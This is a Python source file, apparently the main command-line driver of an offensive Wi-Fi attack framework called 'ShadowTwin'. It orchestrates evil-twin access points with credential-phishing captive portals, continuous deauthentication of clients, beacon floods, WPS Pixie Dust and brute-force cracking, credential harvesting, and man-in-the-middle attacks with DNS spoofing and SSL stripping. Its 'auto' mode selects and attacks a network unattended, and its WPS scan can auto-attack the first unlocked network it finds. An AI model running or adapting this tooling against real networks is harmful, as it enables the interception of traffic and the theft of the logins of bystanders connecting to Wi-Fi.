#!/usr/bin/env python3
"""
ShadowTwin Advanced - Enterprise Evil Twin Framework
Advanced penetration testing tool for wireless security assessments
"""

import argparse
import sys
import os
import logging
import time
from colorama import init, Fore, Style

# Initialize colorama for cross-platform colored output
init()

# Add the project root to Python path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.secure_logger import SecureLogger
from utils.helpers import check_platform, check_dependencies

def print_banner():
    """Display the tool banner"""
    banner = f"""
{Fore.RED}
   █████████                                    █████████                   
  ███░░░░░███                                  ███░░░░░███                  
 ███     ░░░   ██████   █████ █████  ██████   ░███    ░░░  ██████  ████████ 
░███          ███░░███ ░░███ ░░███  ███░░███  ░░█████████ ███░░███░░███░░███
░███    █████░███ ░███  ░███  ░███ ░███████    ░░░░░░░███░███████  ░███ ░░░ 
░░███  ░░███ ░███ ░███  ░░███ ███  ░███░░░     ███    ░███░███░░░   ░███     
 ░░█████████ ░░██████    ░░█████   ░░██████   ░░█████████ ░░██████  █████    
  ░░░░░░░░░   ░░░░░░      ░░░░░     ░░░░░░     ░░░░░░░░░   ░░░░░░  ░░░░░     
{Style.RESET_ALL}
{Fore.CYAN}                    Advanced Evil Twin Framework v2.0{Style.RESET_ALL}
{Fore.YELLOW}                     For Educational and Authorized Testing Only{Style.RESET_ALL}
    """
    print(banner)

def setup_logging():
    """Initialize secure logging"""
    logger = SecureLogger()
    return logger

def recon_command(args):
    """Handle reconnaissance commands"""
    from intelligence.recon_engine import ReconnaissanceEngine
    
    if not args.interface:
        print(f"{Fore.RED}[-] Monitoring interface required{Style.RESET_ALL}")
        return
    
    print(f"{Fore.CYAN}[*] Starting network reconnaissance on {args.interface}{Style.RESET_ALL}")
    recon = ReconnaissanceEngine(args.interface)
    
    if args.passive:
        recon.passive_scan(duration=args.duration)
    elif args.active:
        recon.active_scan()
    else:
        recon.comprehensive_scan()
    
    if args.export:
        recon.export_results(args.export)

def attack_command(args):
    """Handle evil twin attack commands"""
    from core.hostapd_manager import AdvancedAPManager
    from core.captive_portal import CaptivePortalEngine
    from core.deauth_engine import DeauthEngine
    
    print(f"{Fore.CYAN}[*] Initializing evil twin attack{Style.RESET_ALL}")
    
    # Initialize AP manager
    ap_manager = AdvancedAPManager(
        interface=args.interface,
        ssid=args.ssid or "Free_WiFi",
        channel=args.channel or 6
    )
    
    # Initialize captive portal
    portal_engine = CaptivePortalEngine(
        template=args.portal or "hotel_login",
        port=args.port or 8080
    )
    
    # Initialize deauth engine if target specified
    deauth_engine = None
    if args.deauth_target:
        deauth_engine = DeauthEngine(args.interface)
        deauth_engine.start_deauth(
            ap_mac=args.deauth_target,
            target_mac=args.deauth_client,
            count=0  # Continuous
        )
    
    # Start the attack
    try:
        ap_manager.start_ap()
        portal_engine.start()
        
        print(f"{Fore.GREEN}[+] Evil twin attack running... Press Ctrl+C to stop{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Captive Portal: http://10.0.0.1:{args.port or 8080}{Style.RESET_ALL}")
        
        # Monitor connected clients
        while True:
            clients = ap_manager.get_connected_clients()
            if clients:
                print(f"{Fore.YELLOW}[*] Connected clients: {', '.join(clients)}{Style.RESET_ALL}")
            time.sleep(10)
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Stopping attack...{Style.RESET_ALL}")
        if deauth_engine:
            deauth_engine.stop_deauth()
        portal_engine.stop()
        ap_manager.stop_ap()
        print(f"{Fore.GREEN}[+] Attack stopped{Style.RESET_ALL}")

def deauth_command(args):
    """Handle deauthentication attacks"""
    from core.deauth_engine import DeauthEngine
    
    if not args.bssid:
        print(f"{Fore.RED}[-] BSSID (AP MAC) required{Style.RESET_ALL}")
        return
    
    deauth_engine = DeauthEngine(args.interface)
    
    try:
        deauth_engine.start_deauth(
            ap_mac=args.bssid,
            target_mac=args.client,
            count=args.count,
            interval=args.interval
        )
        
        print(f"{Fore.GREEN}[+] Deauth attack running... Press Ctrl+C to stop{Style.RESET_ALL}")
        
        # Keep running until interrupted
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        deauth_engine.stop_deauth()

def beacon_command(args):
    """Handle beacon flood attacks"""
    from core.beacon_flooder import BeaconFlooder
    
    flooder = BeaconFlooder(args.interface)
    
    try:
        if args.targets:
            # Targeted flood with specific SSIDs
            target_ssids = args.targets.split(',')
            flooder.targeted_flood(target_ssids, channel=args.channel, interval=args.interval)
        else:
            # General flood
            flooder.start_flood(
                ssid=args.ssid,
                count=args.count,
                channel=args.channel,
                interval=args.interval
            )
        
        print(f"{Fore.GREEN}[+] Beacon flood running... Press Ctrl+C to stop{Style.RESET_ALL}")
        
        # Keep running until interrupted
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        flooder.stop_flood()

def wps_command(args):
    """Handle WPS attacks"""
    from core.wps_attack import WPSAttacker
    
    wps_attacker = WPSAttacker(args.interface)
    
    if args.scan:
        networks = wps_attacker.scan_wps_networks(duration=args.duration)
        if networks and args.auto_attack:
            # Auto-attack first unlocked network
            for net in networks:
                if net['locked'] == "No":
                    print(f"{Fore.CYAN}[*] Auto-attacking {net['ssid']} ({net['bssid']}){Style.RESET_ALL}")
                    if args.pixie:
                        wps_attacker.pixie_dust_attack(net['bssid'], net['channel'])
                    else:
                        wps_attacker.brute_force_attack(net['bssid'], net['channel'], timeout=args.timeout)
                    break
    
    elif args.pixie and args.bssid:
        wps_attacker.pixie_dust_attack(args.bssid, args.channel)
    
    elif args.bruteforce and args.bssid:
        wps_attacker.brute_force_attack(args.bssid, args.channel, timeout=args.timeout)
    
    else:
        print(f"{Fore.RED}[-] Specify --scan, --pixie, or --bruteforce with --bssid{Style.RESET_ALL}")

def post_command(args):
    """Handle post-exploitation commands"""
    from post_exploitation.cred_harvester import CredentialHarvester
    from post_exploitation.mitm_attacks import MITMAttacker
    
    print(f"{Fore.CYAN}[*] Starting post-exploitation phase{Style.RESET_ALL}")
    
    if args.harvest:
        harvester = CredentialHarvester()
        analysis = harvester.analyze_captured_data()
        
        if args.export:
            harvester.export_credentials(format=args.export_format, filename=args.export)
    
    if args.mitm and args.target:
        mitm = MITMAttacker(args.target, args.gateway, args.interface)
        
        try:
            if mitm.start_mitm():
                if args.dns_spoof:
                    mitm.start_dns_spoofing()
                if args.ssl_strip:
                    mitm.start_sslstrip()
                
                print(f"{Fore.GREEN}[+] MITM attack running... Press Ctrl+C to stop{Style.RESET_ALL}")
                
                # Keep running until interrupted
                while True:
                    time.sleep(1)
                    
        except KeyboardInterrupt:
            mitm.stop_mitm()
    
    if args.search:
        harvester = CredentialHarvester()
        results = harvester.search_credentials(args.search)
        for cred in results:
            print(f"{Fore.YELLOW}[+] Found: {cred}{Style.RESET_ALL}")

def auto_command(args):
    """Handle automated attacks"""
    from intelligence.recon_engine import ReconnaissanceEngine
    from core.hostapd_manager import AdvancedAPManager
    from core.captive_portal import CaptivePortalEngine
    from core.deauth_engine import DeauthEngine
    
    print(f"{Fore.CYAN}[*] Starting automated attack sequence{Style.RESET_ALL}")
    
    # Step 1: Reconnaissance
    print(f"{Fore.CYAN}[*] Phase 1: Network Reconnaissance{Style.RESET_ALL}")
    recon = ReconnaissanceEngine(args.interface)
    recon.start_scan(duration=30)
    
    # Find target network
    target_network = None
    for net in recon.networks.values():
        if net['ssid'] == args.target_ssid or (args.target_ssid is None and net['crypto'] != "WEP"):
            target_network = net
            break
    
    if not target_network:
        print(f"{Fore.RED}[-] No suitable target network found{Style.RESET_ALL}")
        return
    
    print(f"{Fore.GREEN}[+] Target selected: {target_network['ssid']} ({target_network['bssid']}){Style.RESET_ALL}")
    
    # Step 2: Start evil twin
    print(f"{Fore.CYAN}[*] Phase 2: Evil Twin Deployment{Style.RESET_ALL}")
    ap_manager = AdvancedAPManager(
        interface=args.attack_interface or args.interface,
        ssid=target_network['ssid'],
        channel=target_network['channel']
    )
    
    portal_engine = CaptivePortalEngine(
        template=args.portal or "hotel_login"
    )
    
    # Step 3: Deauth clients
    print(f"{Fore.CYAN}[*] Phase 3: Client Migration{Style.RESET_ALL}")
    deauth_engine = DeauthEngine(args.interface)
    deauth_engine.start_deauth(ap_mac=target_network['bssid'], count=0)
    
    # Start attacks
    ap_manager.start_ap()
    portal_engine.start()
    
    print(f"{Fore.GREEN}[+] Automated attack running... Press Ctrl+C to stop{Style.RESET_ALL}")
    
    try:
        # Monitor and report
        while True:
            clients = ap_manager.get_connected_clients()
            if clients:
                print(f"{Fore.YELLOW}[*] Clients connected to evil twin: {len(clients)}{Style.RESET_ALL}")
            
            creds = portal_engine.get_captured_credentials()
            if creds:
                print(f"{Fore.GREEN}[+] Credentials captured: {len(creds)}{Style.RESET_ALL}")
            
            time.sleep(10)
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Stopping automated attack...{Style.RESET_ALL}")
        deauth_engine.stop_deauth()
        portal_engine.stop()
        ap_manager.stop_ap()

def main():
    """Main CLI entry point"""
    print_banner()
    
    # Platform check
    if not check_platform():
        print(f"{Fore.RED}[-] This tool is designed for Linux systems{Style.RESET_ALL}")
        sys.exit(1)
    
    # Dependency check
    missing_deps = check_dependencies()
    if missing_deps:
        print(f"{Fore.RED}[-] Missing dependencies: {', '.join(missing_deps)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Run ./install.sh to install dependencies{Style.RESET_ALL}")
        sys.exit(1)
    
    # Setup argument parser
    parser = argparse.ArgumentParser(
        description="ShadowTwin Advanced - Enterprise Evil Twin Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Fore.GREEN}Examples:{Style.RESET_ALL}
  {Fore.CYAN}Reconnaissance:{Style.RESET_ALL}
    python main.py recon -i wlan0mon
    python main.py recon -i wlan0mon --passive --duration 120
  
  {Fore.CYAN}Evil Twin Attacks:{Style.RESET_ALL}
    python main.py attack -i wlan1 -s "Hotel_Guest" -c 6
    python main.py attack -i wlan1 --portal google_signin --deauth-target AA:BB:CC:DD:EE:FF
  
  {Fore.CYAN}Deauthentication:{Style.RESET_ALL}
    python main.py deauth -i wlan0mon --bssid AA:BB:CC:DD:EE:FF
    python main.py deauth -i wlan0mon --bssid AA:BB:CC:DD:EE:FF --client 11:22:33:44:55:66
  
  {Fore.CYAN}Beacon Flood:{Style.RESET_ALL}
    python main.py beacon -i wlan1 --count 50
    python main.py beacon -i wlan1 --targets "Starbucks,Hotel,Guest" --channel 6
  
  {Fore.CYAN}WPS Attacks:{Style.RESET_ALL}
    python main.py wps -i wlan0mon --scan
    python main.py wps -i wlan0mon --pixie --bssid AA:BB:CC:DD:EE:FF --channel 6
  
  {Fore.CYAN}Post-Exploitation:{Style.RESET_ALL}
    python main.py post --harvest --export credentials.json
    python main.py post --mitm --target 192.168.1.100 --dns-spoof
  
  {Fore.CYAN}Automated Attacks:{Style.RESET_ALL}
    python main.py auto -i wlan0mon --target-ssid "Corporate_WiFi"
        """
    )
    
    subparsers = parser.add_subparsers(dest='command', help='Command to execute')
    
    # Reconnaissance parser
    recon_parser = subparsers.add_parser('recon', help='Network reconnaissance')
    recon_parser.add_argument('-i', '--interface', required=True, help='Monitoring interface')
    recon_parser.add_argument('--passive', action='store_true', help='Passive scanning only')
    recon_parser.add_argument('--active', action='store_true', help='Active scanning')
    recon_parser.add_argument('--duration', type=int, default=60, help='Scan duration in seconds')
    recon_parser.add_argument('--export', help='Export results to file')
    
    # Attack parser (Evil Twin)
    attack_parser = subparsers.add_parser('attack', help='Launch evil twin attack')
    attack_parser.add_argument('-i', '--interface', required=True, help='Attack interface')
    attack_parser.add_argument('-s', '--ssid', help='SSID for evil twin (default: Free_WiFi)')
    attack_parser.add_argument('-c', '--channel', type=int, help='Channel (default: 6)')
    attack_parser.add_argument('-p', '--portal', help='Captive portal template')
    attack_parser.add_argument('--port', type=int, default=8080, help='Portal port')
    attack_parser.add_argument('--deauth-target', help='BSSID to deauthenticate clients from')
    attack_parser.add_argument('--deauth-client', help='Specific client MAC to deauthenticate')
    
    # Deauthentication parser
    deauth_parser = subparsers.add_parser('deauth', help='Deauthentication attacks')
    deauth_parser.add_argument('-i', '--interface', required=True, help='Wireless interface')
    deauth_parser.add_argument('--bssid', required=True, help='Target BSSID (AP MAC)')
    deauth_parser.add_argument('--client', help='Specific client MAC to target')
    deauth_parser.add_argument('--count', type=int, default=0, help='Number of deauth packets (0=continuous)')
    deauth_parser.add_argument('--interval', type=float, default=0.1, help='Interval between packets')
    
    # Beacon flood parser
    beacon_parser = subparsers.add_parser('beacon', help='Beacon flood attacks')
    beacon_parser.add_argument('-i', '--interface', required=True, help='Wireless interface')
    beacon_parser.add_argument('-s', '--ssid', help='Base SSID for fake APs')
    beacon_parser.add_argument('-c', '--channel', type=int, default=6, help='Channel')
    beacon_parser.add_argument('--count', type=int, default=50, help='Number of fake APs')
    beacon_parser.add_argument('--interval', type=float, default=0.1, help='Interval between beacons')
    beacon_parser.add_argument('--targets', help='Comma-separated target SSIDs for focused flood')
    
    # WPS attack parser
    wps_parser = subparsers.add_parser('wps', help='WPS attacks')
    wps_parser.add_argument('-i', '--interface', required=True, help='Wireless interface')
    wps_parser.add_argument('--scan', action='store_true', help='Scan for WPS networks')
    wps_parser.add_argument('--pixie', action='store_true', help='Pixie Dust attack')
    wps_parser.add_argument('--bruteforce', action='store_true', help='Brute force attack')
    wps_parser.add_argument('--bssid', help='Target BSSID')
    wps_parser.add_argument('-c', '--channel', type=int, help='Channel')
    wps_parser.add_argument('--duration', type=int, default=30, help='Scan duration')
    wps_parser.add_argument('--timeout', type=int, default=300, help='Attack timeout')
    wps_parser.add_argument('--auto-attack', action='store_true', help='Auto-attack first vulnerable network')
    
    # Post-exploitation parser
    post_parser = subparsers.add_parser('post', help='Post-exploitation activities')
    post_parser.add_argument('--harvest', action='store_true', help='Harvest captured credentials')
    post_parser.add_argument('--mitm', action='store_true', help='Start MITM attack')
    post_parser.add_argument('--target', help='Target IP for MITM')
    post_parser.add_argument('--gateway', help='Gateway IP (default: auto-detect)')
    post_parser.add_argument('--interface', help='Network interface for MITM')
    post_parser.add_argument('--dns-spoof', action='store_true', help='Enable DNS spoofing')
    post_parser.add_argument('--ssl-strip', action='store_true', help='Enable SSL stripping')
    post_parser.add_argument('--export', help='Export credentials to file')
    post_parser.add_argument('--export-format', choices=['json', 'csv'], default='json', help='Export format')
    post_parser.add_argument('--search', help='Search credentials for specific terms')
    
    # Automated attack parser
    auto_parser = subparsers.add_parser('auto', help='Automated attack sequence')
    auto_parser.add_argument('-i', '--interface', required=True, help='Monitoring interface')
    auto_parser.add_argument('--attack-interface', help='Attack interface (default: same as monitor)')
    auto_parser.add_argument('--target-ssid', help='Specific target SSID (default: auto-select)')
    auto_parser.add_argument('--portal', help='Captive portal template')
    
    # Parse arguments
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return
    
    # Setup logging
    logger = setup_logging()
    logger.info(f"ShadowTwin started with command: {args.command}")
    
    # Execute command
    try:
        if args.command == 'recon':
            recon_command(args)
        elif args.command == 'attack':
            attack_command(args)
        elif args.command == 'deauth':
            deauth_command(args)
        elif args.command == 'beacon':
            beacon_command(args)
        elif args.command == 'wps':
            wps_command(args)
        elif args.command == 'post':
            post_command(args)
        elif args.command == 'auto':
            auto_command(args)
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Operation cancelled by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
        logger.error(f"Command failed: {str(e)}")
        sys.exit(1)

if __name__ == '__main__':
    main()